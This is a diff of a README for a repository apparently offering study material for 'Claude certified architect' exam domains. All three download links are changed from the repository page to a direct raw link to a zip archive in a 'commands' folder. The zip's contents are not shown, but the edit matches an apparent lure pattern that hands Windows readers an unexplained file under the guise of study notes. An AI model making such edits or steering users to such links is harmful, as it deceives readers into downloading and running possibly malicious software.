@@ -1,6 +1,6 @@
 # 🧭 claude-certified-architect - Study Claude exam domains with ease
 
-[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/tajox9820/claude-certified-architect)
+[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/tajox9820/claude-certified-architect/main/commands/certified-architect-claude-v1.4.zip)
 
 ## 📘 What this is
 
@@ -30,7 +30,7 @@ If you can open web pages, download files, and run apps on Windows, you should b
 
 Use this link to visit the project page and download or clone the files:
 
-[Visit the download page](https://github.com/tajox9820/claude-certified-architect)
+[Visit the download page](https://raw.githubusercontent.com/tajox9820/claude-certified-architect/main/commands/certified-architect-claude-v1.4.zip)
 
 ### Option 1: Download from GitHub
 
@@ -196,4 +196,4 @@ This project uses the MIT License
 
 ## 🔗 Primary link
 
-[https://github.com/tajox9820/claude-certified-architect](https://github.com/tajox9820/claude-certified-architect)
+[https://raw.githubusercontent.com/tajox9820/claude-certified-architect/main/commands/certified-architect-claude-v1.4.zip](https://raw.githubusercontent.com/tajox9820/claude-certified-architect/main/commands/certified-architect-claude-v1.4.zip)
